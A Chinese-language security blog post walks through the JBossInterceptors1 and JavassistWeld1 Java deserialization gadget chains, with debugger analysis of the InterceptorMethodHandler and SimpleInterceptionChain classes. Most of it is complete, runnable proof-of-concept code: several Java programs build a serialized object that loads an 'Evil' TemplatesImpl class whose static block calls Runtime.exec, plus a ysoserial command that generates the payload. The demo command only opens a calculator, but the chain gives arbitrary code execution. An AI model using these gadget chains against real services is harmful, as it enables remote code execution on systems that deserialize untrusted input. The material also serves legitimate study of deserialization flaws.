> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzkwMzQyMTg5OA==&mid=2247487980&idx=1&sn=458c8c0a91f96b54bfd02c02a7623273

#  Java 安全 | JBossInterceptors1 & JavassistWeld1 链  
原创 Heihu577  Heihu Share   2025-06-26 04:26  
  
# JBossInterceptors1 & JavassistWeld1 链  
  
- 前言  
- 分析前置知识  
- 调用栈分析  
- 实例图 (分析成员属性)  
- 链路分析  
- org.jboss.interceptor.proxy.InterceptorInvocation$InterceptorMethodInvocation::invoke -> 危险方法 & 未实现 Serializable  
- org.jboss.interceptor.proxy.SimpleInterceptionChain::invokeNextInterceptor -> 链式调用 & 未实现 Serializable  
- org.jboss.interceptor.proxy.InterceptorMethodHandler -> 链路开头 & 链路末尾 & 实现 Serializable  
- JavassistWeld1 链  
- 本链说明  
- POC  
- Ending...  
## 前言  
> JBossInterceptors1  @matthias_kaiser                       javassist:3.12.1.GA, 
```
jboss-interceptor-core:2.0.0.Final
```

  
, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21  
  
> JavassistWeld1      @matthias_kaiser                       javassist:3.12.1.GA, 
```
weld-core:1.1.33.Final
```

  
, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21  
  
  
两条 RCE 链, 需要引入的依赖比较多, 并且链路类与类之间的关系抽象化, 链路最终会调用到未实现
```
Serializable
```

  
接口的类进行
```
RCE
```

  
, 接下来看具体分析.  
## 分析前置知识  
### 调用栈分析  
  
首先看一下在
```
ysoserial
```

  
中最终
```
Payload
```

  
长啥样:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn6uT0Y9G3mhXadKvVPGSmCsI0dibCToiaGuUle5g00bK2hicnSUia7RxcibrwWdvcY5orIOaF91F5hlBFw/640?wx_fmt=png&from=appmsg "")  
  
实际上
```
InterceptorMethodHandler
```

  
这个类就是整条链路的
```
source点
```

  
以及
```
sink点
```

  
, 为什么这么说呢？这里笔者使用
```
ysoserial
```

  
进行生成一个
```
poc
```

  
:  
> java -jar ysoserial-all.jar JBossInterceptors1 "calc" > D:/1.ser  
  
  
随后本地准备如下代码进行运行并
```
DEBUG
```

  
即可:  

```
package com.heihu577;

import java.io.FileInputStream;
import java.io.ObjectInputStream;

public class Main {
    public static void main(String[] args) throws Exception {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(&#34;D:/1.ser&#34;));
        objectInputStream.readObject();
    }
}

```

  
如图:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn6uT0Y9G3mhXadKvVPGSmCs5EQmjLZkXTAPT8KQ8uX2libpPGVZsUrqljuF0paic3YWrgRbPA8FIQOg/640?wx_fmt=png&from=appmsg "")  
  
实际上漏洞形成原因也就是因为这边调用了
```
SimpleInterceptionChain::invokeNextInterceptor
```

  
方法, 如图:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn6uT0Y9G3mhXadKvVPGSmCshh1iaKVNl7kAVaZpVibM6Dyzrl6mIfWq4WkeYEhHyxpn89vcVkFqgk8w/640?wx_fmt=png&from=appmsg "")  
  
这里我们就知道最终的调用点原来在
```
InterceptorInvocation::invoke
```

  
方法中. 是
```
任意对象.任意方法()
```

  
的一个经典案例.  
### 实例图 (分析成员属性)  
  
上述调用栈跟踪我们已经浅浅的知道了流程, 而由于漏洞本身就是由
```
InterceptorInvocation
```

  
这个类发起的, 所以这里使用
```
debug
```

  
的方式进行观察该类下的成员属性都放了一些什么值:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn6uT0Y9G3mhXadKvVPGSmCso3a2jia1BOlpeeiceOkz6RmcaaAZicfbrcWnGibvLvCRMlJqeXhchJqWZA/640?wx_fmt=png&from=appmsg "")  
  
通过上图可以看到, 属性中的值都是由不同的类生成过来的, 他们之间的实例极其复杂. 这里不会手把手梳理这些类与类之间的关系, 后续只会说明构造 POC 的大致思路, 链路的 sink 点才是我们关注的.  
## 链路分析  
### org.jboss.interceptor.proxy.InterceptorInvocation$InterceptorMethodInvocation::invoke -> 危险方法 & 未实现 Serializable  
  
根据刚才的调用栈其实也看到了, 罪魁祸首实际上是
```
org.jboss.interceptor.proxy.InterceptorInvocation$InterceptorMethodInvocation::invoke
```

  
, 我们可以看一下该成员内部类中的
```
invoke
```

  
方法的具体实现:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn6uT0Y9G3mhXadKvVPGSmCsKwURTeHic13vqQZSYtSLT2Qq6EIFVyo8n9drYfLr8V2dHdAzb9riaOXw/640?wx_fmt=png&from=appmsg "")  
  
需要注意的是该类并没有实现
```
Serializable
```

  
接口, 但是为了便于理解, 我们会从源头开始构造 POC, 一步一步说明整体构造 POC 的思路.  
  
通过这边的
```
invoke
```

  
方法的定义我们可以知道的是, 只要传入进来的参数为
```
NULL
```

  
, 那么就可以执行任意对象的任意方法.  
  
而由于该成员内部类构造器的成员属性为
```
默认
```

  
, 所以我们需要通过反射进行获取构造器. 而通过反射获取成员内部类的构造器有一个小坑点, 可以参考: https://mp.weixin.qq.com/s/1AlCr2RAUrOffN1dBcU6zw 来解决这个问题.  
  
并且这边构造器第二个参数的
```
method
```

  
并不是
```
Java原生Method
```

  
, 而是一个
```
MethodMetata
```

  
实例, 对于
```
MethodMetadata
```

  
如何进行创建呢, 实际上可以通过
```
DefaultMethodMetadata
```

  
类进行创建, 而
```
DefaultMethodMetadata
```

  
又会引出更多的关系:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn6uT0Y9G3mhXadKvVPGSmCs4rnGiaYZ2EvUoNlKRSRy7pY5ZpJiaYLib6elxZuo9YkKQsLcYJP7RcFOg/640?wx_fmt=png&from=appmsg "")  
  
一边是基于
```
InterceptionType
```

  
枚举类的
```
Set
```

  
, 一边是使用
```
MethodReference.of
```

  
来进行生成一个
```
MethodReference
```

  
, 最终可以编写出如下本地 POC:  

```
package com.heihu577;

import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.jboss.interceptor.builder.MethodReference;
import org.jboss.interceptor.proxy.InterceptorInvocation;
import org.jboss.interceptor.reader.DefaultMethodMetadata;
import org.jboss.interceptor.spi.metadata.MethodMetadata;
import org.jboss.interceptor.spi.model.InterceptionType;
import sun.misc.Unsafe;

import javax.interceptor.InvocationContext;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashSet;
import java.util.Set;

public class POC {
    public static void main(String[] args) throws Exception {
        // 准备 TemplatesImpl
        TemplatesImpl templatesImpl = getTemplatesImpl();
        // 准备 MethodMetadata
        HashSet<Object> hsSet = new HashSet<>();
        hsSet.add(InterceptionType.POST_ACTIVATE);
        Constructor<DefaultMethodMetadata> defaultMethodMetadataConstructor = DefaultMethodMetadata.class.getDeclaredConstructor(Set.class, MethodReference.class);
        defaultMethodMetadataConstructor.setAccessible(true);
        MethodMetadata defaultMethodMetadata = (MethodMetadata) defaultMethodMetadataConstructor.newInstance(hsSet,
                MethodReference.of(TemplatesImpl.class.getMethod(&#34;newTransformer&#34;), true));
        // 准备 InterceptorInvocation$InterceptorMethodInvocation
        Class<?> interceptorMethodInvocation = Class.forName(&#34;org.jboss.interceptor.proxy.InterceptorInvocation$InterceptorMethodInvocation&#34;);
        Constructor<?> interceptorMethodInvocationDeclaredConstructor = interceptorMethodInvocation.getDeclaredConstructor(InterceptorInvocation.class, Object.class, MethodMetadata.class);
        interceptorMethodInvocationDeclaredConstructor.setAccessible(true);
        InterceptorInvocation interceptorInvocationObj = (InterceptorInvocation) getObjectByUnsafe(InterceptorInvocation.class);
        Object o = interceptorMethodInvocationDeclaredConstructor.newInstance(interceptorInvocationObj, templatesImpl, defaultMethodMetadata);
        // 主动调用 invoke 方法
        Method invokeMethod = o.getClass().getDeclaredMethod(&#34;invoke&#34;, InvocationContext.class);
        invokeMethod.setAccessible(true);
        invokeMethod.invoke(o, new Object[]{null});
    }

    // 通过 Unsafe 无视构造方法进行实例化
    public static Object getObjectByUnsafe(Class myclazz) throws Exception {
        Class<?> clazz = Class.forName(&#34;sun.misc.Unsafe&#34;);
        Field theUnsafe = clazz.getDeclaredField(&#34;theUnsafe&#34;); // 因为 theUnsafe 使用 static 进行修饰, 在 static 代码块中进行初始化,
        theUnsafe.setAccessible(true);
        Unsafe o = (Unsafe) theUnsafe.get(null);
        return o.allocateInstance(myclazz);
    }

    public static TemplatesImpl getTemplatesImpl() throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        Field bytecodes = templates.getClass().getDeclaredField(&#34;_bytecodes&#34;); // 最终调用到 defineClass 方法中加载类字节码
        Field name = templates.getClass().getDeclaredField(&#34;_name&#34;); // 放置任意值
        Field tfactory = templates.getClass().getDeclaredField(&#34;_tfactory&#34;);
        name.setAccessible(true);
        bytecodes.setAccessible(true);
        tfactory.setAccessible(true);
        byte[][] myBytes = new byte[1][];
        myBytes[0] = Repository.lookupClass(Evil.class).getBytes(); // 这个恶意类必须继承`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`抽象类, 之前有分析过, 就不提及了.
        bytecodes.set(templates, myBytes);
        name.set(templates, &#34;&#34;);
        tfactory.set(templates, new TransformerFactoryImpl());
        return templates;
    }
}

```

  
运行即可弹出计算器.  
### org.jboss.interceptor.proxy.SimpleInterceptionChain::invokeNextInterceptor -> 链式调用 & 未实现 Serializable  
  
根据之前
```
DEBUG
```

  
的观察, 可以发现在下方进行调用了
```
InterceptorInvocation$InterceptorMethodInvocation::invoke
```

  
方法, 如图:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn6uT0Y9G3mhXadKvVPGSmCsPMx13EJPZp9sqYeHAhpvcwCicotdADLJQrkwWFYHOEaqTe4EwS9JMwg/640?wx_fmt=png&from=appmsg "")  
  
而实际上
```
SimpleInterceptionChain
```

  
这个类也没有实现
```
Serializable
```

  
接口, 并且调用它的
```
invokeNextInterceptor
```

  
方法可以调用到
```
InterceptorInvocation$InterceptorMethodInvocation::invoke
```

  
危险方法中去, 只要能够调用到
```
invokeNextInterceptor
```

  
并且不报错, 实际上就可以完成一次RCE, 当然如果想要调用不报错, 也要分析一下
```
SimpleInterceptionChain
```

  
这个类的构造器:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn6uT0Y9G3mhXadKvVPGSmCsT7CfRRuSDcickVtY4WDMKT6ibkrkQiaAvMrFVFjfZek1mzuuClyxwD8Gw/640?wx_fmt=png&from=appmsg "")  
  
这些属性之间的关系比较麻烦, 就不在文章中说明了, 可以编写如下 POC:  

```
package com.heihu577;

import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.jboss.interceptor.builder.MethodReference;
import org.jboss.interceptor.proxy.InterceptorInvocation;
import org.jboss.interceptor.proxy.InterceptorInvocationContext;
import org.jboss.interceptor.proxy.SimpleInterceptionChain;
import org.jboss.interceptor.reader.DefaultMethodMetadata;
import org.jboss.interceptor.reader.SimpleInterceptorMetadata;
import org.jboss.interceptor.spi.metadata.MethodMetadata;
import org.jboss.interceptor.spi.model.InterceptionType;
import sun.misc.Unsafe;

import javax.interceptor.InvocationContext;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.*;

public class POC {
    public static void main(String[] args) throws Throwable {
        // 准备 TemplatesImpl
        TemplatesImpl templatesImpl = getTemplatesImpl();
        // 准备 MethodMetadata
        HashSet<Object> hsSet = new HashSet<>();
        hsSet.add(InterceptionType.POST_ACTIVATE);
        Constructor<DefaultMethodMetadata> defaultMethodMetadataConstructor = DefaultMethodMetadata.class.getDeclaredConstructor(Set.class, MethodReference.class);
        defaultMethodMetadataConstructor.setAccessible(true);
        Method newTransformer = TemplatesImpl.class.getMethod(&#34;newTransformer&#34;);
        MethodMetadata defaultMethodMetadata = (MethodMetadata) defaultMethodMetadataConstructor.newInstance(hsSet,
                MethodReference.of(newTransformer, true));
        // 准备 InterceptorInvocation$InterceptorMethodInvocation
        Class<?> interceptorMethodInvocationClazz = Class.forName(&#34;org.jboss.interceptor.proxy.InterceptorInvocation$InterceptorMethodInvocation&#34;);
        Constructor<?> interceptorMethodInvocationDeclaredConstructor = interceptorMethodInvocationClazz.getDeclaredConstructor(InterceptorInvocation.class, Object.class, MethodMetadata.class);
        interceptorMethodInvocationDeclaredConstructor.setAccessible(true);
        // InterceptorInvocation interceptorInvocationObj = (InterceptorInvocation) getObjectByUnsafe(InterceptorInvocation.class);
        InterceptorInvocation interceptorInvocationObj = new InterceptorInvocation(templatesImpl, new SimpleInterceptorMetadata(null, false,  new HashMap<>()), InterceptionType.POST_ACTIVATE);
        org.jboss.interceptor.proxy.InterceptorInvocation.InterceptorMethodInvocation interceptorMethodInvocation = (org.jboss.interceptor.proxy.InterceptorInvocation.InterceptorMethodInvocation) interceptorMethodInvocationDeclaredConstructor.newInstance(interceptorInvocationObj, templatesImpl, defaultMethodMetadata);
        //        // 主动调用 invoke 方法
//        Method invokeMethod = o.getClass().getDeclaredMethod(&#34;invoke&#34;, InvocationContext.class);
//        invokeMethod.setAccessible(true);
//        invokeMethod.invoke(o, new Object[]{null});
        Collection<InterceptorInvocation<?>> interceptorInvocationObjLst = new ArrayList<>();
        interceptorInvocationObjLst.add(interceptorInvocationObj);
        SimpleInterceptionChain simpleInterceptionChain = new SimpleInterceptionChain(interceptorInvocationObjLst, null, templatesImpl, newTransformer);
        // 手动调用 invokeNextInterceptor 触发弹窗
        simpleInterceptionChain.invokeNextInterceptor(new InterceptorInvocationContext(simpleInterceptionChain, templatesImpl, newTransformer, null));
    }

//    // 通过 Unsafe 无视构造方法进行实例化
//    public static Object getObjectByUnsafe(Class myclazz) throws Exception {
//        Class<?> clazz = Class.forName(&#34;sun.misc.Unsafe&#34;);
//        Field theUnsafe = clazz.getDeclaredField(&#34;theUnsafe&#34;); // 因为 theUnsafe 使用 static 进行修饰, 在 static 代码块中进行初始化,
//        theUnsafe.setAccessible(true);
//        Unsafe o = (Unsafe) theUnsafe.get(null);
//        return o.allocateInstance(myclazz);
//    }

    public static TemplatesImpl getTemplatesImpl() throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        Field bytecodes = templates.getClass().getDeclaredField(&#34;_bytecodes&#34;); // 最终调用到 defineClass 方法中加载类字节码
        Field name = templates.getClass().getDeclaredField(&#34;_name&#34;); // 放置任意值
        Field tfactory = templates.getClass().getDeclaredField(&#34;_tfactory&#34;);
        name.setAccessible(true);
        bytecodes.setAccessible(true);
        tfactory.setAccessible(true);
        byte[][] myBytes = new byte[1][];
        myBytes[0] = Repository.lookupClass(Evil.class).getBytes(); // 这个恶意类必须继承`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`抽象类, 之前有分析过, 就不提及了.
        bytecodes.set(templates, myBytes);
        name.set(templates, &#34;&#34;);
        tfactory.set(templates, new TransformerFactoryImpl());
        return templates;
    }
}

```

  
运行即可弹出计算器.  
### org.jboss.interceptor.proxy.InterceptorMethodHandler -> 链路开头 & 链路末尾 & 实现 Serializable  
  
上面两个案例实际上都会在
```
org.jboss.interceptor.proxy.InterceptorMethodHandler
```

  
类中满足某些分支的情况下进行主动调用
```
SimpleInterceptionChain::invokeNextInterceptor
```

  
, 但是前提是需要清晰的划分我们应该定义哪些成员属性, 那些成员属性的实例化方式是什么, 变量与变量之间存在哪些联系, 绕过什么样的if分支才能走到最终的
```
sink点
```

  
, 这才是最终要考虑的地方, 举个例子:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn6uT0Y9G3mhXadKvVPGSmCsALP3XWFLZl0aTa630SkkoSax9kumZg7EemR89icb5icZGic9Ioq1TYN0w/640?wx_fmt=png&from=appmsg "")  
  
整个过程无意义且枯燥, 那么就不再仔细研究他们之间的关系了.  
#### POC  
  
给出如下POC:  

```
package com.heihu577;

import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.jboss.interceptor.builder.BuildableInterceptionModel;
import org.jboss.interceptor.builder.InterceptionModelBuilder;
import org.jboss.interceptor.builder.MethodReference;
import org.jboss.interceptor.proxy.DefaultInvocationContextFactory;
import org.jboss.interceptor.proxy.DirectClassInterceptorInstantiator;
import org.jboss.interceptor.proxy.InterceptorMethodHandler;
import org.jboss.interceptor.reader.ClassMetadataInterceptorReference;
import org.jboss.interceptor.reader.DefaultMethodMetadata;
import org.jboss.interceptor.reader.ReflectiveClassMetadata;
import org.jboss.interceptor.reader.SimpleInterceptorMetadata;
import org.jboss.interceptor.spi.instance.InterceptorInstantiator;
import org.jboss.interceptor.spi.metadata.ClassMetadata;
import org.jboss.interceptor.spi.metadata.InterceptorReference;
import org.jboss.interceptor.spi.metadata.MethodMetadata;
import org.jboss.interceptor.spi.model.InterceptionModel;
import org.jboss.interceptor.spi.model.InterceptionType;


import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.*;

public class UnserialPOC {
    public static void main(String[] args) throws Exception {
        TemplatesImpl evilObj = getTemplatesImpl();
        Method evilMethod = evilObj.getClass().getMethod(&#34;newTransformer&#34;);

        InterceptionModelBuilder builder = InterceptionModelBuilder.newBuilderFor(HashMap.class);
        ReflectiveClassMetadata metadata = (ReflectiveClassMetadata) ReflectiveClassMetadata.of(HashMap.class);
        InterceptorReference interceptorReference = ClassMetadataInterceptorReference.of(metadata);

        Set<InterceptionType> s = new HashSet<>();
        s.add(InterceptionType.POST_ACTIVATE); // 准备一个 Set, 内容为 InterceptionType.POST_ACTIVATE
        DefaultMethodMetadata methodMetadata = getObjByReflection(DefaultMethodMetadata.class,
                new Class[]{Set.class, MethodReference.class},
                new Object[]{s, MethodReference.of(evilMethod, true)});


        List list = new ArrayList();
        list.add(methodMetadata);
        Map<InterceptionType, List<MethodMetadata>> hashMap = new HashMap<>();
        hashMap.put(InterceptionType.POST_ACTIVATE, list); // 准备一个 Map, Key 为 Set 中存在的内容

        SimpleInterceptorMetadata simpleInterceptorMetadata =
                new SimpleInterceptorMetadata(interceptorReference, true, hashMap);
        builder.interceptAll().with(simpleInterceptorMetadata);
        InterceptionModel model = builder.build();

        HashMap map = new HashMap();
        map.put(&#34;heihu577&#34;, &#34;heihu577&#34;);
        DefaultInvocationContextFactory factory = new DefaultInvocationContextFactory();
        InterceptorInstantiator interceptorInstantiator = new InterceptorInstantiator() {
            public Object createFor(InterceptorReference paramInterceptorReference) {
                return evilObj;
            }
        };
        InterceptorMethodHandler gadget = new InterceptorMethodHandler(map, metadata, model, interceptorInstantiator, factory);
        new ObjectOutputStream(new FileOutputStream(&#34;D:/1.ser&#34;)).writeObject(gadget);
        new ObjectInputStream(new FileInputStream(&#34;D:/1.ser&#34;)).readObject();
    }

    // 通过反射创建实例
    public static <T> T getObjByReflection(Class<T> clazz, Class[] args, Object[] argsValue) throws Exception {
        Constructor declaredConstructor = clazz.getDeclaredConstructor(args);
        declaredConstructor.setAccessible(true);
        return (T) declaredConstructor.newInstance(argsValue);
    }

    public static TemplatesImpl getTemplatesImpl() throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        Field bytecodes = templates.getClass().getDeclaredField(&#34;_bytecodes&#34;); // 最终调用到 defineClass 方法中加载类字节码
        Field name = templates.getClass().getDeclaredField(&#34;_name&#34;); // 放置任意值
        Field tfactory = templates.getClass().getDeclaredField(&#34;_tfactory&#34;);
        name.setAccessible(true);
        bytecodes.setAccessible(true);
        tfactory.setAccessible(true);
        byte[][] myBytes = new byte[1][];
        myBytes[0] = Repository.lookupClass(Evil.class).getBytes(); // 这个恶意类必须继承`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`抽象类, 之前有分析过, 就不提及了.
        bytecodes.set(templates, myBytes);
        name.set(templates, &#34;&#34;);
        tfactory.set(templates, new TransformerFactoryImpl());
        return templates;
    }
}

```

  
切记是 TemplatesImpl, 给出所加载的恶意类:  

```
package com.heihu577;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class Evil extends AbstractTranslet {
    static {
        try {
            Runtime.getRuntime().exec(&#34;calc&#34;);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
}

```

## JavassistWeld1 链  
### 本链说明  
  
这一条链本质上与
```
JBossIntereptors1
```

  
链相同, 只是其中一个依赖变了, 定义
```
pom.xml
```

  
如下:  

```
<dependencies>
    <dependency>
        <groupId>javassist</groupId>
        <artifactId>javassist</artifactId>
        <version>3.12.0.GA</version>
    </dependency>
<!--        <dependency>-->
<!--            <groupId>org.jboss.interceptor</groupId>-->
<!--            <artifactId>jboss-interceptor-core</artifactId>-->
<!--            <version>2.0.0.Final</version>-->
<!--        </dependency>-->
    <dependency>
        <groupId>org.jboss.weld</groupId>
        <artifactId>weld-core</artifactId>
        <version>1.1.33.Final</version>
    </dependency>
    <dependency>
        <groupId>javax.enterprise</groupId>
        <artifactId>cdi-api</artifactId>
        <version>1.0-SP1</version>
    </dependency>
    <dependency>
        <groupId>javax.interceptor</groupId>
        <artifactId>javax.interceptor-api</artifactId>
        <version>3.1</version>
    </dependency>
    <dependency>
        <groupId>org.jboss.interceptor</groupId>
        <artifactId>jboss-interceptor-spi</artifactId>
        <version>2.0.0.Final</version>
    </dependency>
    <dependency>
        <groupId>org.slf4j</groupId>
        <artifactId>slf4j-api</artifactId>
        <version>1.7.21</version>
    </dependency>
</dependencies>

```

  
刷新一下
```
Maven
```

  
即可看到我们之前的 POC 大面积爆红:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn6uT0Y9G3mhXadKvVPGSmCs5y3qT7wcxgwHyDs4KXKyv9OLERicMJSsFE3LKnZLWTw8m9YE7A6ricwQ/640?wx_fmt=png&from=appmsg "")  
  
解决方法很简单, 只需要将
```
import
```

  
语法都删掉, 然后通过 IDEA 重新引入一次就行, 最终引入状况:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn6uT0Y9G3mhXadKvVPGSmCsXsgU8fOneyy9gia1BXOoyr6XdeyWV3f6p4ZHrZh0libj3icYjF7ODxIzw/640?wx_fmt=png&from=appmsg "")  
### POC  

```
package com.heihu577;

import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.jboss.weld.interceptor.builder.InterceptionModelBuilder;
import org.jboss.weld.interceptor.builder.MethodReference;
import org.jboss.weld.interceptor.proxy.DefaultInvocationContextFactory;
import org.jboss.weld.interceptor.proxy.InterceptorMethodHandler;
import org.jboss.weld.interceptor.reader.ClassMetadataInterceptorReference;
import org.jboss.weld.interceptor.reader.DefaultMethodMetadata;
import org.jboss.weld.interceptor.reader.ReflectiveClassMetadata;
import org.jboss.weld.interceptor.reader.SimpleInterceptorMetadata;
import org.jboss.weld.interceptor.spi.instance.InterceptorInstantiator;
import org.jboss.weld.interceptor.spi.metadata.InterceptorReference;
import org.jboss.weld.interceptor.spi.metadata.MethodMetadata;
import org.jboss.weld.interceptor.spi.model.InterceptionModel;
import org.jboss.weld.interceptor.spi.model.InterceptionType;


import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.*;

public class UnserialPOC {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templatesImpl = getTemplatesImpl();
        Method evilMethod = templatesImpl.getClass().getMethod(&#34;newTransformer&#34;);

        InterceptionModelBuilder builder = InterceptionModelBuilder.newBuilderFor(HashMap.class);
        ReflectiveClassMetadata metadata = (ReflectiveClassMetadata) ReflectiveClassMetadata.of(HashMap.class);
        InterceptorReference interceptorReference = ClassMetadataInterceptorReference.of(metadata);

        Set<InterceptionType> s = new HashSet<>();
        s.add(InterceptionType.POST_ACTIVATE);
        DefaultMethodMetadata methodMetadata = getObjByReflection(DefaultMethodMetadata.class,
                new Class[]{Set.class, MethodReference.class},
                new Object[]{s, MethodReference.of(evilMethod, true)});


        List list = new ArrayList();
        list.add(methodMetadata);
        Map<InterceptionType, List<MethodMetadata>> hashMap = new HashMap<>();
        hashMap.put(InterceptionType.POST_ACTIVATE, list);

        SimpleInterceptorMetadata simpleInterceptorMetadata = new SimpleInterceptorMetadata(interceptorReference, true, hashMap);
        builder.interceptAll().with(simpleInterceptorMetadata);
        InterceptionModel model = builder.build();

        HashMap map = new HashMap();
        map.put(&#34;heihu577&#34;, &#34;heihu577&#34;);
        DefaultInvocationContextFactory factory = new DefaultInvocationContextFactory();
        InterceptorInstantiator interceptorInstantiator = new InterceptorInstantiator() {
            @Override
            public Object createFor(InterceptorReference interceptorReference) {
                return templatesImpl;
            }
        };
        InterceptorMethodHandler evilObj = new InterceptorMethodHandler(map, metadata, model, interceptorInstantiator, factory);
        new ObjectOutputStream(new FileOutputStream(&#34;D:/1.ser&#34;)).writeObject(evilObj);
        new ObjectInputStream(new FileInputStream(&#34;D:/1.ser&#34;)).readObject();
    }

    // 通过反射获取成员属性
    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }

    // 通过反射创建实例
    public static <T> T getObjByReflection(Class<T> clazz, Class[] args, Object[] argsValue) throws Exception {
        Constructor declaredConstructor = clazz.getDeclaredConstructor(args);
        declaredConstructor.setAccessible(true);
        return (T) declaredConstructor.newInstance(argsValue);
    }

    public static TemplatesImpl getTemplatesImpl() throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        Field bytecodes = templates.getClass().getDeclaredField(&#34;_bytecodes&#34;); // 最终调用到 defineClass 方法中加载类字节码
        Field name = templates.getClass().getDeclaredField(&#34;_name&#34;); // 放置任意值
        Field tfactory = templates.getClass().getDeclaredField(&#34;_tfactory&#34;);
        name.setAccessible(true);
        bytecodes.setAccessible(true);
        tfactory.setAccessible(true);
        byte[][] myBytes = new byte[1][];
        myBytes[0] = Repository.lookupClass(Evil.class).getBytes(); // 这个恶意类必须继承`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`抽象类, 之前有分析过, 就不提及了.
        bytecodes.set(templates, myBytes);
        name.set(templates, &#34;&#34;);
        tfactory.set(templates, new TransformerFactoryImpl());
        return templates;
    }
}

```

## Ending...  
  
  
  
